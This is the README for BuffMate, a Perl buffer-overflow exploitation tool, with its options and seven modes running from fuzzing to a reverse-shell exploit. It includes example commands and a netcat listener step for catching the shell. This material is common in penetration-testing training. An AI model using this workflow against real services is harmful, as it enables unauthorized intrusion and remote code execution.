# BuffMate

BuffMate is a Perl utility that assists in the process of creating buffer overflow exploits. The entire process from fuzzing to exploitation is streamlined into one tool. Only core Perl modules are utilized for mobility and speed.

Note that certain offensive dependencies are required, such as metasploit-framework and msfvenom. It is recommended that you run this tool on a Kali system which includes these tools.

## Help
```
BuffMate - Perl Buffer Overflow Tool | Steve Collmann - stevcoll@gmail.com

Options:
   -m, --mode            Program mode. See "Modes" below for details.
   -l, --local           Local client address and port (IPv4), colon delimited.
   -r, --remote          Remote server address and port (IPv4), colon delimited.
   -s, --string          String to send before buffer. Multiple strings supported. Optional.
   -o, --offset          Loose offset from fuzzing or exact offset from EIP byte match.
   -b, --bad             Bad character to exclude in payload. Multiple parameters supported.
   -j, --jump            Memory jump return address. Automatically converted to little endian.
   -i, --increment       Step increment for fuzzer. Default: 200 bytes.
   -v, --verbose         Show remote server responses to socket sends.

Examples:
   ./buffmate.pl -m 1 -r 10.0.0.1:80 -s "PWD "                     ## Fuzz remote server
   ./buffmate.pl -m 2 -r 10.0.0.1:80 -s "PWD " -o 140              ## Locate EIP offset
   ./buffmate.pl -m 3 -r 10.0.0.1:80 -s "PWD " -o 136              ## Verify EIP offset
   ./buffmate.pl -m 4 -r 10.0.0.1:80 -s "PWD " -o 136 -b \x15      ## Test and remove bad chars
   ./buffmate.pl -m 5 -r 10.0.0.1:80 -s "PWD " -o 136 -j 39D421E6  ## Test jump address
   ./buffmate.pl -m 6 -l 192.168.1.1:443 -b \x15 -b \x35           ## Generate shellcode
   ./buffmate.pl -m 7 -r 10.0.0.1:80 -s "PWD " -o 136 -j 39D421E6  ## Exploit server

Modes:
   * [1] Fuzzing  
     - Buffer can be sent with or without prepended strings (e.g. "AUTH ").
     - Multiple prepended strings can be sent (e.g. -s "USER " -s "PASS ").
     - Identify buffer size in bytes which causes an exception on service.
   * [2] EIP Match
     - Attach debugger to service and run tool with offset found in fuzzing mode.
     - Ensure prepended string option is used for all stages if required.
     - After service exception debugger should display unique EIP address.
     - Enter unique EIP address into tool and identify exact EIP offset.
   * [3] EIP Verify
     - Attach debugger to service and run tool with exact offset found in EIP match.
     - Verify EIP is overwritten with "B" or "\x42" characters.
     - Verify space for shellcode in "C" or "\x43" characters. (i.e. ~400 bytes).
   * [4] Char Test
     - Attach debugger to service and run tool with discovered offset.
     - Check debugger for evidence of bad characters corrupting the buffer.
     - Remove any bad characters with tool and rerun char test as appropriate.
   * [5] Jump Test
     - Utilize debugger to locate module with no memory protections.
     - Locate appropriate memory address to jump to in discovered module.
     - Ensure memory address contains no bad characters.
     - Attach debugger to service and set breakpoint at jump memory address.
     - Run tool with new jump address and bad char options.
     - Ensure debugger stops at breakpoint and execution redirects to "C" or "\x43".
   * [6] Generate Shellcode
     - Run tool with local (attacking) host and bad char options to generate shellcode.
     - Copy and paste enter $shellcode variable output into top of tool code.
   * [7] Exploit Server
     - Start service on local host with appropriate options (e.g. nc -vlnp 443).
     - Run tool with remote host, offset, jump address, and bad char options.
     - Reverse shell should appear on local host.
```

## Author
Steve Collmann, stevcoll@gmail.com
